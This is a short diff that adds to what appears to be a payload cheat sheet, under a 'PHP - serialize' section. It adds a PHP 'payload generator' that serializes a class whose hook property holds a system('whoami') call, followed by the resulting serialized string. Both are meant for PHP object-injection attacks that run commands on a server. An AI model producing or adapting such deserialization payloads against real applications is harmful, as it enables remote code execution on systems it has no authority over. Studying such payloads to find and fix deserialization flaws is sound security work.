@@ -22,6 +22,21 @@
 
 ## PHP - serialize
 ```sh
+#Payload generator
+
+<?php
+
+class Example2
+{  
+   private $hook = "system('whoami');";
+}
+
+print(urlencode(serialize(new Example2)) . "\n");
+print((serialize(new Example2)) . "\n");
+
+?>
+```
+```sh
 O:8:"Example2":1:{s:14:"Example2hook";s:17:"system('whoami');";} 
 ```
 #####
